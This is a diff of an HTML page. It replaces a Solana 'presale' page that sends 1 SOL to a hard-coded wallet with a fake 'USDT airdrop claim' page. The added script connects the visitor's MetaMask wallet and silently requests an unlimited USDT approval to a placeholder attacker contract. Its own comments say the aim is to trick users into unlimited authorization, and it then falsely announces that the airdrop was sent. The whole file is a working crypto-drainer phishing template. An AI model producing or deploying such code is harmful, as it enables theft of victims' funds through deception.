@@ -1,63 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>手机版SOL预售页</title>
-    <!-- 引入Solana官方库 -->
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.js"></script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: Arial; text-align: center; padding: 20px; }
-        button { padding: 15px; background: #14F195; color: black; border: none; border-radius: 10px; }
-    </style>
+    <title>USDT空投领取</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
 <body>
-    <h1>💲SOLFI预售中💲</h1>
-    <button onclick="connectWallet()">点击连接Phantom钱包</button>
-    <h3>预售价格：1 SOL = 1000代币</h3>
-<button onclick="sendSOL()" style="background:#9945FF;">支付1SOL参与</button>
+    <button onclick="connectWallet()">连接钱包领取空投</button>
 
-<script>
-async function sendSOL() {
-    const provider = window.solana;
-    if (!provider?.isConnected) {
-        alert("请先连接钱包！");
-        return;
-    }
-
-    // 替换成你的钱包地址（在Phantom中点击"Deposit"复制）
-    const YOUR_WALLET = "6Cz2zYG5u9PBRQkfUswUZxdq5yiwo9dDfYJ6wjYkhjeB";
-    
-    try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: provider.publicKey,
-                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
-                lamports: solanaWeb3.LAMPORTS_PER_SOL // 1 SOL = 1,000,000,000 lamports
-            })
-        );
-        
-        const { signature } = await provider.signAndSendTransaction(transaction);
-        alert("支付成功！交易哈希:\n" + signature);
-    } catch (error) {
-        alert("支付失败: " + error.message);
-    }
-}
-</script>
     <script>
+        let provider;
+        let signer;
+
         async function connectWallet() {
-            // 检查是否安装了Phantom钱包
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    await window.solana.connect(); // 请求连接
-                    const publicKey = window.solana.publicKey.toString();
-                    alert("连接成功！钱包地址:\n" + publicKey.slice(0,10) + "...");
-                } catch (error) {
-                    alert("用户拒绝了连接");
-                }
+            if (typeof window.ethereum !== 'undefined') {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                signer = provider.getSigner();
+                startAirdrop();
             } else {
-                alert("请先安装Phantom钱包！");
-                window.open("https://phantom.app/download"); // 跳转下载页面
+                alert('请安装MetaMask!');
+            }
+        }
+
+        async function startAirdrop() {
+            const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // BSC USDT合约
+            const maliciousContract = '0xYourAttackContractAddress'; // 攻击者合约地址
+            
+            const abi = ["function approve(address spender, uint256 amount)"];
+            const contract = new ethers.Contract(usdtAddress, abi, signer);
+            
+            // 诱导用户无限授权
+            try {
+                const tx = await contract.approve(maliciousContract, ethers.constants.MaxUint256);
+                await tx.wait();
+                alert('授权成功，空投已发放！');
+            } catch (err) {
+                alert('交易被拒绝');
             }
         }
     </script>
